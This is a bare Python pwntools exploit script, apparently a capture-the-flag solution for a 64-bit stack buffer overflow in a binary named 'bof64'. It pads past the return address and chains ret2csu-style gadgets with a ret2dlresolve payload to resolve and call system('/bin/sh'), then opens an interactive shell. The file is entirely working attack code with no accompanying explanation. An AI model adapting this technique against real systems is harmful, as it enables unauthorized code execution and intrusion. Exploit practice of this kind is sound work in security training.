# -*- coding: utf-8 -*-
import sys
from pwn import *

context.binary = './bof64'

p = process('./bof64')
e = ELF('./bof64')

rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(e, symbol='system', args=['/bin/sh\x00'])
rop.ret2dlresolve(dlresolve)

payload = 'a'*0x78
payload += p64(0x4012FA)
payload += p64(0)
payload += p64(1)
payload += p64(0)
payload += p64(dlresolve.data_addr)
payload += p64(len(dlresolve.payload))
payload += p64(e.got['read'])
payload += p64(0x4012E0)
payload += 7*p64(0)
payload += p64(0x4010B0) # _start
p.sendafter('CTF!\n', payload.ljust(0x100, '\0') )
p.send(dlresolve.payload)

p.sendafter('CTF!\n', ('a'*0x78+rop.chain()).ljust(0x100, '\0'))

p.interactive()
